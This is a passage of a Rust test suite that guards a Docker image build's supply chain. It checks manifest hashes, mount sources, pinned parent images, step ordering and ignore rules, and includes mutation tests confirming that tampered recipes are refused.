    for (relative, source) in entrypoints {
        for needle in ["refresh-parent-pins", "imagetools inspect"] {
            if source.contains(needle) {
                offenders.push(format!("{relative}: {needle}"));
            }
        }
        scanned += 1;
    }
    for (relative, source) in repository_files(".github/workflows", None, Some("yml")) {
        for needle in ["refresh-parent-pins", "imagetools inspect"] {
            if source.contains(needle) {
                offenders.push(format!("{relative}: {needle}"));
            }
        }
        scanned += 1;
    }
    assert!(
        offenders.is_empty(),
        "parent maintenance reached a build path: {offenders:?}"
    );
    assert!(
        scanned > 10,
        "the maintenance scan covered only {scanned} sources"
    );
}

// --- repository base identity (#95) -----------------------------------------
//
// `images/base-inputs.sha256` is the committed list of images/ files the base is
// built from. The in-build verifier re-hashes exactly those entries, the base
// stamps the manifest's own hash, and a local consumer compares its expectation
// with that stamp. This gate owns what the recipes and the extension can get
// wrong without running Docker: a mount list that no longer matches the root
// list, a stamp that is not the last build step, a consumer check that runs after
// the work it guards, a context source outside the roots, an ignore rule that
// hides a listed file, and an extension default that is not a real manifest hash.

const BASE_INPUT_MANIFEST: &str = "images/base-inputs.sha256";
/// The canonical root list, also declared by `script/build/base-inputs.sh`
/// (`generated_base_input_roots` proves the two agree).
const BASE_INPUT_ROOTS: [&str; 11] = [
    ".dockerignore",
    "Dockerfile",
    "apt-policy",
    "artifacts",
    "install-artifact.sh",
    "install-build-ca.sh",
    "install-pnpm.sh",
    "install-zellij.sh",
    "pnpm",
    "recipe-contract",
    "verify-base-inputs.sh",
];
const BASE_SOURCE_ROOT: &str = "/tmp/base-source";
const BASE_STAMP: &str = "/opt/agent-vm/base/source-identity";
const BASE_VERIFIER: &str = "verify-base-inputs.sh";
const BASE_IDENTITY_ARG: &str = "AGENT_VM_BASE_IDENTITY";
const BASE_EXTENSION_CHECK: &str = "check-base-identity.sh";

/// A Dockerfile-specific ignore file replaces `images/.dockerignore` for that
/// build, so the reviewed ignore policy would no longer be the one the manifest
/// was generated under. Checked against a root argument so the mutation control
/// can create one without touching the checkout.
fn check_ignore_overrides(root: &Path) -> Result<(), String> {
    for path in [
        "images/Dockerfile.dockerignore",
        "images/standard/Dockerfile.dockerignore",
    ] {
        if root.join(path).exists() {
            return Err(format!(
                "a Dockerfile-specific ignore override is not reviewed: {path}"
            ));
        }
    }
    Ok(())
}

fn under_base_input_roots(path: &str) -> bool {
    BASE_INPUT_ROOTS.iter().any(|root| {
        path == *root
            || path
                .strip_prefix(root)
                .is_some_and(|rest| rest.starts_with('/'))
    })
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct BaseInput {
    path: String,
    digest: String,
}

fn validate_manifest_path(path: &str) -> Result<(), String> {
    if path.is_empty() || path.starts_with('/') {
        return Err(format!("manifest path must be images-relative: {path:?}"));
    }
    if !path
        .bytes()
        .all(|byte| byte.is_ascii_alphanumeric() || b"._/-".contains(&byte))
    {
        return Err(format!("unsupported character in manifest path: {path}"));
    }
    for component in path.split('/') {
        if component.is_empty() || component == "." || component == ".." {
            return Err(format!("unsupported manifest path component in: {path}"));
        }
    }
    if path == "base-inputs.sha256" {
        return Err("the manifest lists itself".into());
    }
    if !under_base_input_roots(path) {
        return Err(format!(
            "manifest entry is outside the base input roots: {path}"
        ));
    }
    Ok(())
}

/// The committed format is one line per input, byte-sorted, two spaces between
/// the hash and the path. A file that only happens to be *readable* as
/// `sha256sum -c` input is not the format the generator writes.
fn parse_base_inputs(text: &str) -> Result<Vec<BaseInput>, String> {
    if text.is_empty() || !text.ends_with('\n') {
        return Err("the manifest must be non-empty and end with a newline".into());
    }
    if text.contains('\r') {
        return Err("the manifest must use LF line endings".into());
    }
    let mut entries: Vec<BaseInput> = Vec::new();
    for line in text.lines() {
        if line.len() < 67 {
            return Err(format!("malformed manifest entry: {line:?}"));
        }
        let digest = &line[..64];
        if !is_lower_hex(digest, 64) {
            return Err(format!("malformed manifest hash: {digest}"));
        }
        if &line[64..66] != "  " {
            return Err(format!("malformed manifest separator: {line:?}"));
        }
        let path = &line[66..];
        validate_manifest_path(path)?;
        if let Some(previous) = entries.last()
            && path <= previous.path.as_str()
        {
            return Err(format!(
                "manifest paths are not strictly byte-ordered at {path}"
            ));
        }
        entries.push(BaseInput {
            path: path.to_owned(),
            digest: digest.to_owned(),
        });
    }
    if entries.is_empty() {
        return Err("the manifest is empty".into());
    }
    Ok(entries)
}

/// Each root must contribute at least one entry: an emptied root is a recipe
/// that stopped consuming it, or a manifest that silently lost its inputs.
fn check_base_input_coverage(entries: &[BaseInput]) -> Result<(), String> {
    for root in BASE_INPUT_ROOTS {
        if !entries.iter().any(|entry| {
            entry.path == root
                || entry
                    .path
                    .strip_prefix(root)
                    .is_some_and(|rest| rest.starts_with('/'))
        }) {
            return Err(format!(
                "base input root contributes no manifest entry: {root}"
            ));
        }
    }
    Ok(())
}

/// Read the generator's own root array, so the two lists cannot drift apart
/// silently: adding a root in one place fails this gate until it is added in
/// both places and in the mount lists.
fn generated_base_input_roots() -> Result<Vec<String>, String> {
    let source = read_text("script/build/base-inputs.sh");
    let prefix = "BASE_INPUT_ROOTS=(";
    let mut collected = String::new();
    let mut inside = false;
    for line in source.lines() {
        if !inside {
            let Some(rest) = line.trim_start().strip_prefix(prefix) else {
                continue;
            };
            inside = true;
            collected.push_str(rest);
        } else {
            collected.push_str(line);
        }
        if collected.trim_end().ends_with(')') {
            break;
        }
        collected.push(' ');
    }
    let Some(body) = collected.trim_end().strip_suffix(')') else {
        return Err("base-inputs.sh no longer declares a closed BASE_INPUT_ROOTS array".into());
    };
    Ok(body.split_whitespace().map(str::to_owned).collect())
}

/// BuildKit reads a mount flag wherever it sits on a RUN, so the context-source
/// gate must not stop at the first non-mount flag. A positional walk is a
/// different question and uses `leading_mount_specs`.
fn mount_specs(instruction: &str) -> Vec<String> {
    instruction
        .split_whitespace()
        .skip(1)
        .filter_map(|token| token.strip_prefix("--mount="))
        .map(unquote_spec)
        .collect()
}

fn leading_mount_specs(instruction: &str) -> Vec<String> {
    instruction
        .split_whitespace()
        .skip(1)
        .take_while(|token| token.starts_with("--mount="))
        .map(|token| unquote_spec(&token["--mount=".len()..]))
        .collect()
}

/// BuildKit unquotes a flag value, so `--mount='from=node:22,...'` is the same
/// mount as the bare spelling. Splitting the raw token instead yields the field
/// name `'from`, which no reference check recognizes, so the quote was a way to
/// smuggle a floating image past this gate (#96 review).
fn unquote_spec(value: &str) -> String {
    for quote in ['\'', '"'] {
        if value.len() >= 2 && value.starts_with(quote) && value.ends_with(quote) {
            return value[1..value.len() - 1].to_owned();
        }
    }
    value.to_owned()
}

/// The context source a mount consumes, if any. A missing `type` is a context
/// bind, `src` is an alias of `source`, and only `from=` names something other
/// than the build context.
fn mount_context_source(spec: &str) -> Result<Option<String>, String> {
    if mount_field(spec, "from").is_some() {
        return Ok(None);
    }
    if mount_field(spec, "type").as_deref().unwrap_or("bind") != "bind" {
        return Ok(None);
    }
    let source = mount_field(spec, "source")
        .or_else(|| mount_field(spec, "src"))
        .ok_or_else(|| format!("binding mount without a source: {spec}"))?;
    Ok(Some(source))
}

fn mount_field(spec: &str, key: &str) -> Option<String> {
    spec.split(',')
        .filter_map(|part| part.split_once('='))
        .find(|(name, _)| *name == key)
        .map(|(_, value)| value.to_owned())
}

fn mount_flag(spec: &str, flag: &str) -> bool {
    spec.split(',').any(|part| part == flag)
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct StampRun {
    mounts: Vec<String>,
    sources: Vec<String>,
    action: String,
}

/// The one instruction that runs the repository-base-identity verifier. Every
/// bind mount must land inside `/tmp/base-source/<source>` so the same
/// images-relative paths the manifest lists are the ones hashed.
fn parse_stamp_run(source: &str) -> Result<StampRun, String> {
    let mut runs: Vec<StampRun> = Vec::new();
    for instruction in dockerfile_instructions(source) {
        if !instruction.starts_with("RUN ") || !instruction.contains(BASE_VERIFIER) {
            continue;
        }
        let tokens: Vec<&str> = instruction.split_whitespace().collect();
        let mounts = leading_mount_specs(&instruction);
        let mut sources = Vec::new();
        for spec in &mounts {
            if mount_field(spec, "type").as_deref() != Some("bind") {
                return Err(format!(
                    "the base identity run must use binding mounts only: {spec}"
                ));
            }
            let source = mount_field(spec, "source")
                .ok_or_else(|| format!("binding mount without a source: {spec}"))?;
            let target = mount_field(spec, "target")
                .ok_or_else(|| format!("binding mount without a target: {spec}"))?;
            if target != format!("{BASE_SOURCE_ROOT}/{source}") {
                return Err(format!(
                    "binding mount target {target} is not {BASE_SOURCE_ROOT}/{source}"
                ));
            }
            if !mount_flag(spec, "ro") {
                return Err(format!("binding mount is not read-only: {spec}"));
            }
            sources.push(source);
        }
        let tail = &tokens[1 + mounts.len()..];
        let verifier = format!("{BASE_SOURCE_ROOT}/{BASE_VERIFIER}");
        if tail.len() != 5
            || tail[0] != "sh"
            || tail[1] != verifier
            || tail[2] != BASE_SOURCE_ROOT
            || tail[4] != BASE_STAMP
        {
            return Err(format!(
                "the base identity run must be `sh {verifier} {BASE_SOURCE_ROOT} \
                 ACTION {BASE_STAMP}`, found {tail:?}"
            ));
        }
        runs.push(StampRun {
            mounts,
            sources,
            action: tail[3].to_owned(),
        });
    }
    match runs.len() {
        0 => Err(format!(
            "no recipe runs the base identity verifier ({BASE_VERIFIER})"
        )),
        1 => Ok(runs.remove(0)),
        _ => Err("the base identity verifier runs more than once in one recipe".into()),
    }
}

fn expected_mount_sources() -> Vec<String> {
    let mut sources = vec!["base-inputs.sha256".to_owned()];
    sources.extend(BASE_INPUT_ROOTS.iter().map(|root| (*root).to_owned()));
    sources
}

fn check_stamp_runs(base: &str, standard: &str) -> Result<(), String> {
    let base_run = parse_stamp_run(base)?;
    let standard_run = parse_stamp_run(standard)?;
    if base_run.action != "stamp" {
        return Err(format!(
            "the base recipe must stamp the identity, found action {}",
            base_run.action
        ));
    }
    if standard_run.action != "verify" {
        return Err(format!(
            "the standard recipe must verify the parent stamp, found action {}",
            standard_run.action
        ));
    }
    if base_run.mounts != standard_run.mounts {
        return Err("the two base identity runs must mount identical sets".into());
    }
    if base_run.sources != expected_mount_sources() {
        return Err(format!(
            "the base identity run mounts {:?}, not the root list plus the manifest",
            base_run.sources
        ));
    }
    Ok(())
}

/// The stamp is the last build step, so it covers everything the recipe
/// installed; only CMD may follow it.
fn check_base_stamp_is_last_run(base: &str) -> Result<(), String> {
    let instructions = dockerfile_instructions(base);
    let Some(position) = instructions
        .iter()
        .rposition(|instruction| instruction.starts_with("RUN "))
    else {
        return Err("the base recipe has no RUN instruction".into());
    };
    if !instructions[position].contains(BASE_VERIFIER) {
        return Err("the base identity stamp is not the last RUN instruction".into());
    }
    for instruction in &instructions[position + 1..] {
        if !instruction.starts_with("CMD ") {
            return Err(format!(
                "only CMD may follow the base identity stamp, found {instruction}"
            ));
        }
    }
    Ok(())
}

/// The consumer check is the first thing the product stage does, so a base from
/// other sources fails before any agent installation can succeed.
fn check_standard_verify_is_first_product_run(standard: &str) -> Result<(), String> {
    let instructions = dockerfile_instructions(standard);
    let Some(start) = instructions.iter().rposition(|instruction| {
        instruction.to_ascii_uppercase().starts_with("FROM ")
            && instruction.contains("${BASE_IMAGE}")
    }) else {
        return Err("the standard recipe no longer declares the product stage".into());
    };
    let product = &instructions[start + 1..];
    let Some(first) = product.iter().position(|instruction| {
        matches!(
            instruction.split_whitespace().next(),
            Some("RUN" | "COPY" | "ADD")
        )
    }) else {
        return Err("the product stage does no work".into());
    };
    if !product[first].starts_with("RUN ") || !product[first].contains(BASE_VERIFIER) {
        return Err(format!(
            "the parent stamp must be verified before any product work, found {}",
            product[first]
        ));
    }
    Ok(())
}

/// Everything the base recipe takes from its context is a base input. A new
/// `COPY` or bind mount outside the roots is a source the manifest does not
/// describe, and the generator and mount list have to grow together.
fn check_base_context_sources(base: &str) -> Result<(), String> {
    for instruction in dockerfile_instructions(base) {
        let tokens: Vec<&str> = instruction.split_whitespace().collect();
        let Some(name) = tokens.first() else { continue };
        match name.to_ascii_uppercase().as_str() {
            "COPY" | "ADD" => {
                let mut rest = &tokens[1..];
                let mut from_stage = false;
                while let Some(flag) = rest.first() {
                    if !flag.starts_with("--") {
                        break;
                    }
                    if flag.starts_with("--from") {
                        from_stage = true;
                    }
                    rest = &rest[1..];
                }
                if from_stage {
                    continue;
                }
                if rest.len() < 2 {
                    return Err(format!("malformed context copy: {instruction}"));
                }
                for source in &rest[..rest.len() - 1] {
                    check_context_source(source.trim_end_matches('/'))?;
                }
            }
            "RUN" => {
                for spec in mount_specs(&instruction) {
                    if let Some(source) = mount_context_source(&spec)? {
                        check_context_source(source.trim_end_matches('/'))?;
                    }
                }
            }
            _ => {}
        }
    }
    Ok(())
}

/// The external image an instruction copies or mounts from, if any.
fn image_input_references(instruction: &str) -> Vec<String> {
    let mut references = Vec::new();
    let upper = instruction.to_ascii_uppercase();
    if upper.starts_with("COPY ") || upper.starts_with("ADD ") {
        for token in instruction.split_whitespace().skip(1) {
            if let Some(reference) = token.strip_prefix("--from=") {
                references.push(reference.to_owned());
            } else if !token.starts_with("--") {
                break;
            }
        }
    }
    if upper.starts_with("RUN ") {
        for spec in mount_specs(instruction) {
            if let Some(reference) = mount_field(&spec, "from") {
                references.push(reference);
            } else if mount_field(&spec, "type").as_deref() == Some("image")
                && let Some(source) =
                    mount_field(&spec, "source").or_else(|| mount_field(&spec, "src"))
            {
                // A `type=image` mount takes an image reference in `source`
                // rather than `from`; today's builder rejects the mount type,
                // but a frontend bump would make it a way in.
                references.push(source);
            }
        }
    }
    references
}

/// A `--from` reference has to be a reviewed input: a stage declared in this
/// recipe, a stage index, or a parent image whose digest is in the inventory.
///
/// `COPY --from=node:22 /usr/local/ /usr/local/` and
/// `RUN --mount=from=node:22,...` both passed every other guard while replacing
/// the pinned Node with a floating image's copy (#96 review).
fn check_image_reference(
    path: &str,
    reference: &str,
    stages: &BTreeSet<String>,
    stage_count: usize,
    known: &BTreeSet<String>,
) -> Result<(), String> {
    if stages.contains(&reference.to_ascii_lowercase()) {
        return Ok(());
    }
    if let Ok(index) = reference.parse::<usize>()
        && index < stage_count
    {
        return Ok(());
    }
    if let Some((_, digest)) = reference.split_once("@sha256:") {
        if known.contains(&format!("sha256:{digest}")) {
            return Ok(());
        }
        return Err(format!(
            "{path}: --from={reference} names a digest that is not in {PARENT_INVENTORY}"
        ));
    }
    Err(format!(
        "{path}: --from={reference} must name a stage declared in this recipe or a parent \
         image pinned by digest in {PARENT_INVENTORY} (#96)"
    ))
}

fn check_image_inputs(
    recipes: &BTreeMap<String, String>,
    inventory: &ParentInventory,
) -> Result<(), String> {
    let known: BTreeSet<String> = inventory
        .pins
        .values()
        .map(|pin| pin.reference().digest.value().to_owned())
        .collect();
    for (path, source) in recipes {
        let froms = parse_froms(source)?;
        let stages: BTreeSet<String> = froms
            .iter()
            .filter_map(|from| from.stage.as_deref())
            .map(str::to_ascii_lowercase)
            .collect();
        for instruction in dockerfile_instructions(source) {
            for reference in image_input_references(&instruction) {
                check_image_reference(path, &reference, &stages, froms.len(), &known)?;
            }
        }
    }
    Ok(())
}

/// A package step is any `RUN` whose own words run apt.
fn is_package_step(instruction: &str) -> bool {
    instruction.starts_with("RUN ")
        && instruction_commands(instruction).iter().any(|words| {
            words
                .first()
                .is_some_and(|word| APT_PROGRAMS.contains(&word.rsplit('/').next().unwrap_or(word)))
        })
}

/// The base recipe has to check the inherited apt baseline *before* any package
/// step and the final source set *after* the last one (#96). Deleting either
/// invocation used to leave the static gate green, so both call sites are
/// required here: the baseline is only a baseline if it runs first.
fn check_apt_baseline_brackets_build(base: &str) -> Result<(), String> {
    let instructions = dockerfile_instructions(base);
    let checks: Vec<usize> = instructions
        .iter()
        .enumerate()
        .filter(|(_, instruction)| {
            instruction.starts_with("RUN ") && instruction.contains("apt-policy/check-sources.sh")
        })
        .map(|(index, _)| index)
        .collect();
    if checks.len() < 2 {
        return Err(format!(
            "the base recipe must run images/apt-policy/check-sources.sh twice - on the \
             inherited baseline before any package step and on the final source set before \
             the identity stamp - found {} invocation(s) (#96)",
            checks.len()
        ));
    }
    let (first, last) = (checks[0], checks[checks.len() - 1]);
    let steps: Vec<usize> = instructions
        .iter()
        .enumerate()
        .filter(|(_, instruction)| is_package_step(instruction))
        .map(|(index, _)| index)
        .collect();
    if let Some(step) = steps.first()
        && first > *step
    {
        return Err(format!(
            "the first images/apt-policy/check-sources.sh run must come before the first \
             package step, found it after instruction {step}"
        ));
    }
    if let Some(step) = steps.last()
        && last < *step
    {
        return Err(format!(
            "the final images/apt-policy/check-sources.sh run must come after the last \
             package step, found it before instruction {step}"
        ));
    }
    let Some(stamp) = instructions.iter().rposition(|instruction| {
        instruction.starts_with("RUN ") && instruction.contains(BASE_VERIFIER)
    }) else {
        return Err("the base recipe has no identity stamp to bracket".into());
    };
    for (index, instruction) in instructions.iter().enumerate() {
        if index <= last || index >= stamp {
            continue;
        }
        if matches!(
            instruction.split_whitespace().next(),
            Some("RUN" | "COPY" | "ADD")
        ) {
            return Err(format!(
                "only the identity stamp may follow the final \
                 images/apt-policy/check-sources.sh run, found {instruction}"
            ));
        }
    }
    Ok(())
}

fn check_context_source(source: &str) -> Result<(), String> {
    if source == "base-inputs.sha256" {
        return Ok(());
    }
    if !under_base_input_roots(source) {
        return Err(format!(
            "base context source is outside the base input roots: {source}"
        ));
    }
    Ok(())
}

/// Docker's ignore file is the last word on what the mounts contain, so a
/// pattern that excludes a listed file would turn the manifest check into a
/// silent partial check. Later rules win, and a `!` rule re-includes.
fn dockerignore_hidden(patterns: &str, path: &str) -> bool {
    let segments: Vec<&str> = path.split('/').collect();
    let mut hidden = false;
    for line in patterns.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let (negated, pattern) = match line.strip_prefix('!') {
            Some(rest) => (true, rest.trim()),
            None => (false, line),
        };
        let pattern = pattern.strip_prefix('/').unwrap_or(pattern);
        let pattern = pattern.strip_suffix('/').unwrap_or(pattern);
        if pattern.is_empty() {
            continue;
        }
        let pattern: Vec<&str> = pattern.split('/').collect();
        let matched = (1..=segments.len()).any(|end| dirtree_match(&pattern, &segments[..end]));
        if matched {
            hidden = !negated;
        }
    }
    hidden
}

fn dirtree_match(pattern: &[&str], path: &[&str]) -> bool {
    let Some((head, tail)) = pattern.split_first() else {
        return path.is_empty();
    };
    if *head == "**" {
        return (0..=path.len()).any(|skip| dirtree_match(tail, &path[skip..]));
    }
    match path.split_first() {
        Some((first, rest)) => segment_match(head, first) && dirtree_match(tail, rest),
        None => false,
    }
}

/// Only `*` and `?` are interpreted. A character class or any other
/// metacharacter is treated as matching, because this gate must never conclude
/// "not hidden" from a pattern it cannot read.
fn segment_match(pattern: &str, segment: &str) -> bool {
    let pattern = pattern.as_bytes();
    let segment = segment.as_bytes();
    match pattern.split_first() {
        None => segment.is_empty(),
        Some((b'*', rest)) => (0..=segment.len()).any(|skip| glob_match(rest, &segment[skip..])),
        Some((b'?', rest)) => !segment.is_empty() && glob_match(rest, &segment[1..]),
        Some((b'[', _)) => true,
        Some((byte, rest)) => segment
            .split_first()
            .is_some_and(|(first, tail)| first == byte && glob_match(rest, tail)),
    }
}

fn glob_match(pattern: &[u8], text: &[u8]) -> bool {
    match pattern.split_first() {
        None => text.is_empty(),
        Some((b'*', rest)) => (0..=text.len()).any(|skip| glob_match(rest, &text[skip..])),
        Some((b'?', rest)) => !text.is_empty() && glob_match(rest, &text[1..]),
        Some((b'[', _)) => true,
        Some((byte, rest)) => text
            .split_first()
            .is_some_and(|(first, tail)| first == byte && glob_match(rest, tail)),
    }
}

/// The copied extension is the one consumer that carries its expectation in its
/// own bytes: the generated default is this checkout's manifest identity.
fn extension_identity(extension: &str) -> Result<String, String> {
    let instructions = dockerfile_instructions(extension);
    let defaults = global_defaults(&instructions);
    if defaults.get("BASE_IMAGE").map(String::as_str) != Some(LOCAL_BASE) {
        return Err(format!(
            "the extension's default base must be {LOCAL_BASE}, found {:?}",
            defaults.get("BASE_IMAGE")
        ));
    }
    let identity = defaults
        .get(BASE_IDENTITY_ARG)
        .ok_or_else(|| format!("the extension declares no default {BASE_IDENTITY_ARG}"))?
        .clone();
    let Some(hex) = identity.strip_prefix("sha256:") else {
        return Err(format!(
            "the extension identity is not a digest: {identity}"
        ));
    };
    if !is_lower_hex(hex, 64) {
        return Err(format!(
            "the extension identity is not a digest: {identity}"
        ));
    }
    if hex == "0".repeat(64) {
        return Err(format!(
            "the extension identity is the reserved placeholder, not a manifest hash: {identity}"
        ));
    }
    let declarations = instructions
        .iter()
        .filter(|instruction| {
            instruction.starts_with("ARG ")
                && instruction
                    .split_whitespace()
                    .any(|word| word.starts_with(&format!("{BASE_IDENTITY_ARG}=")))
        })
        .count();
    if declarations != 1 {
        return Err(format!(
            "the extension must declare exactly one {BASE_IDENTITY_ARG} default, found {declarations}"
        ));
    }
    let stage_local = instructions
        .iter()
        .any(|instruction| instruction == &format!("ARG {BASE_IDENTITY_ARG}"));
    if !stage_local {
        return Err(format!(
            "the extension must redeclare {BASE_IDENTITY_ARG} inside the stage without a default"
        ));
    }
    let checks: Vec<&String> = instructions
        .iter()
        .filter(|instruction| instruction.contains(BASE_EXTENSION_CHECK))
        .collect();
    if checks.len() != 1 {
        return Err(format!(
            "the extension must run {BASE_EXTENSION_CHECK} exactly once, found {}",
            checks.len()
        ));
    }
    let expected = format!("sh /tmp/{BASE_EXTENSION_CHECK} \"${BASE_IDENTITY_ARG}\"");
    if !checks[0].ends_with(&expected) {
        return Err(format!(
            "the extension check must run {expected}, found {}",
            checks[0]
        ));
    }
    let spec =
        format!("type=bind,source={BASE_EXTENSION_CHECK},target=/tmp/{BASE_EXTENSION_CHECK},ro");
    if !mount_specs(checks[0]).contains(&spec) {
        return Err(format!(
            "the extension check must bind-mount {BASE_EXTENSION_CHECK} read-only"
        ));
    }
    Ok(identity)
}

#[test]
fn the_committed_base_inputs_bind_both_recipes_and_the_extension() {
    let entries = parse_base_inputs(&read_text(BASE_INPUT_MANIFEST)).unwrap();
    check_base_input_coverage(&entries).unwrap();
    assert_eq!(
        generated_base_input_roots().unwrap(),
        BASE_INPUT_ROOTS.map(str::to_owned).to_vec(),
        "BASE_INPUT_ROOTS and script/build/base-inputs.sh disagree"
    );
    let base = read_text("images/Dockerfile");
    let standard = read_text("images/standard/Dockerfile");
    check_stamp_runs(&base, &standard).unwrap();
    check_base_stamp_is_last_run(&base).unwrap();
    check_standard_verify_is_first_product_run(&standard).unwrap();
    check_base_context_sources(&base).unwrap();
    let ignore = read_text("images/.dockerignore");
    for entry in &entries {
        assert!(
            !dockerignore_hidden(&ignore, &entry.path),
            "images/.dockerignore hides the listed input {}",
            entry.path
        );
    }
    check_ignore_overrides(&repo_path("")).unwrap();
    let identity = extension_identity(&read_text("examples/base-extension/Dockerfile")).unwrap();
    assert!(
        identity.starts_with("sha256:"),
        "the extension carries a manifest identity"
    );
}

#[test]
fn base_input_identity_mutations_are_refused() {
    let manifest = read_text(BASE_INPUT_MANIFEST);
    let base = read_text("images/Dockerfile");
    let standard = read_text("images/standard/Dockerfile");
    let extension = read_text("examples/base-extension/Dockerfile");
    let ignore = read_text("images/.dockerignore");
    let entries = parse_base_inputs(&manifest).unwrap();
    let verifier_entry = entries
        .iter()
        .find(|entry| entry.path == BASE_VERIFIER)
        .expect("the verifier is a listed input");
    let first_entry = entries.first().unwrap();
    let second_entry = entries.get(1).unwrap();

    let manifest_mutations: Vec<(&str, String)> = vec![
        (
            "duplicate entry",
            format!("{manifest}{}\n", manifest.lines().next().unwrap()),
        ),
        (
            "out-of-order entries",
            manifest.replacen(
                &format!(
                    "{}  {}\n{}  {}\n",
                    first_entry.digest, first_entry.path, second_entry.digest, second_entry.path
                ),
                &format!(
                    "{}  {}\n{}  {}\n",
                    second_entry.digest, second_entry.path, first_entry.digest, first_entry.path
                ),
                1,
            ),
        ),
        (
            "absolute path",
            manifest.replace("  Dockerfile\n", "  /Dockerfile\n"),
        ),
        (
            "traversal path",
            manifest.replace("  Dockerfile\n", "  ../Dockerfile\n"),
        ),
        (
            "path outside the roots",
            manifest.replace("  Dockerfile\n", "  standard/Dockerfile\n"),
        ),
        (
            "self entry",
            manifest.replace("  Dockerfile\n", "  base-inputs.sha256\n"),
        ),
        (
            "uppercase hash",
            manifest.replacen(&first_entry.digest, &first_entry.digest.to_uppercase(), 1),
        ),
        (
            "single-space separator",
            manifest.replacen("  Dockerfile\n", " Dockerfile\n", 1),
        ),
        (
            "missing verifier entry",
            manifest.replace(
                &format!("{}  {}\n", verifier_entry.digest, verifier_entry.path),
                "",
            ),
        ),
        (
            "CRLF line endings",
            manifest.replacen("  Dockerfile\n", "  Dockerfile\r\n", 1),
        ),
        ("empty manifest", String::new()),
    ];
    for (label, edited) in manifest_mutations {
        assert_ne!(edited, manifest, "{label}: mutation did not apply");
        let accepted = parse_base_inputs(&edited).is_ok()
            && check_base_input_coverage(&parse_base_inputs(&edited).unwrap_or_default()).is_ok();
        assert!(!accepted, "accepted a manifest mutation: {label}");
    }

    let drop_mount: String = base
        .lines()
        .filter(|line| !line.contains("source=pnpm,target=/tmp/base-source/pnpm"))
        .map(|line| format!("{line}\n"))
        .collect();
    let renamed_action = base.replacen(
        " stamp /opt/agent-vm/base/source-identity",
        " verify /opt/agent-vm/base/source-identity",
        1,
    );
    let extra_source = base.replace(
        "CMD [\"/bin/bash\"]",
        "COPY tools/dsh/package.json /opt/agent-vm/unlisted/package.json\n\nCMD [\"/bin/bash\"]",
    );
    let moved_stamp = base.replace("CMD [\"/bin/bash\"]", "RUN true\n\nCMD [\"/bin/bash\"]");
    let no_stamp = base
        .lines()
        .filter(|line| !line.contains("verify-base-inputs.sh"))
        .map(|line| format!("{line}\n"))
        .collect::<String>();
    assert_ne!(drop_mount, base, "the drop-mount mutation applies");
    assert_ne!(renamed_action, base, "the action mutation applies");
    assert_ne!(extra_source, base, "the extra-source mutation applies");
    assert_ne!(moved_stamp, base, "the moved-stamp mutation applies");
    for (label, edited) in [
        ("dropped mount", drop_mount.clone()),
        ("base verifies instead of stamping", renamed_action),
        ("unlisted base context source", extra_source),
        ("stamp is no longer the last RUN", moved_stamp),
    ] {
        assert!(
            check_stamp_runs(&edited, &standard).is_err()
                || check_base_stamp_is_last_run(&edited).is_err()
                || check_base_context_sources(&edited).is_err(),
            "accepted a base identity mutation: {label}"
        );
    }
    assert!(
        parse_stamp_run(&no_stamp).is_err(),
        "a base recipe without the identity stamp must fail"
    );

    // The context-source gate is the only control on a new base input, so every
    // BuildKit spelling that reaches the context must be seen.
    let typeless_mount = base.replacen(
        "--mount=type=bind,source=pnpm,target=/tmp/pnpm-source,ro",
        "--mount=source=unlisted,target=/tmp/pnpm-source,ro",
        1,
    );
    let src_alias_mount = base.replacen(
        "--mount=type=bind,source=pnpm,target=/tmp/pnpm-source,ro",
        "--mount=type=bind,src=unlisted,target=/tmp/pnpm-source,ro",
        1,
    );
    let mount_after_flag = base.replacen(
        "RUN --mount=type=bind,source=install-pnpm.sh,target=/tmp/install-pnpm.sh,ro",
        "RUN --network=none --mount=type=bind,source=unlisted,target=/tmp/install-pnpm.sh,ro",
        1,
    );
    for (label, edited) in [
        ("typeless context mount", typeless_mount),
        ("src alias of source", src_alias_mount),
        ("context mount after a non-mount flag", mount_after_flag),
    ] {
        assert_ne!(edited, base, "{label}: mutation did not apply");
        let error = check_base_context_sources(&edited)
            .expect_err(&format!("accepted a base context source mutation: {label}"));
        assert!(
            error.contains("outside the base input roots: unlisted"),
            "{label}: unexpected refusal: {error}"
        );
    }
    // Mounts that read no context stay allowed: a cache mount and a mount from
    // another stage.
    let cache_mount = base.replacen(
        "RUN mkdir -p /opt/agent && chmod 755 /opt/agent",
        "RUN --mount=type=cache,target=/var/cache/apt mkdir -p /opt/agent && chmod 755 /opt/agent",
        1,
    );
    let from_mount = base.replacen(
        "--mount=type=bind,source=pnpm,target=/tmp/pnpm-source,ro",
        "--mount=type=bind,from=recipe-contract-bin,source=/out,target=/tmp/pnpm-source,ro",
        1,
    );
    assert_ne!(cache_mount, base, "the cache-mount control applies");
    assert_ne!(from_mount, base, "the from-mount control applies");
    for (label, edited) in [("cache mount", cache_mount), ("from mount", from_mount)] {
        check_base_context_sources(&edited)
            .unwrap_or_else(|error| panic!("refused a context-free mount ({label}): {error}"));
    }

    let late_verify = standard.replacen(
        "reviewed exact selections.\"\n",
        "reviewed exact selections.\"\nCOPY tools/dsh/package.json /opt/agent-vm/unlisted.json\n",
        1,
    );
    let moved_verify = standard
        .lines()
        .filter(|line| !line.contains("verify-base-inputs.sh /tmp/base-source verify"))
        .map(|line| format!("{line}\n"))
        .collect::<String>();
    assert_ne!(late_verify, standard, "the late-verify mutation applies");
    for (label, edited) in [
        ("product work before the check", late_verify),
        ("standard without the check", moved_verify),
    ] {
        assert!(
            check_stamp_runs(&base, &edited).is_err()
                || check_standard_verify_is_first_product_run(&edited).is_err(),
            "accepted a standard identity mutation: {label}"
        );
    }

    for (label, pattern) in [
        ("exact listed file", verifier_entry.path.clone()),
        ("listed directory", "pnpm".to_owned()),
        ("nested listed file", "pnpm/pin.json".to_owned()),
        ("glob at any depth", "**/pin.json".to_owned()),
        ("star within a segment", "pnpm/*.json".to_owned()),
        ("character class", "pnpm/[p]in.json".to_owned()),
        ("anchored path", "/pnpm/pin.json".to_owned()),
        ("directory form", "pnpm/".to_owned()),
    ] {
        let hiding = format!("{ignore}{pattern}\n");
        assert!(
            entries
                .iter()
                .any(|entry| dockerignore_hidden(&hiding, &entry.path)),
            "did not notice an ignore rule hiding a listed input: {label}"
        );
    }
    // A Dockerfile-specific ignore file would hide files this gate cannot see.
    let overridden = std::env::temp_dir().join(format!(
        "image-sources-ignore-override-{}",
        std::process::id()
    ));
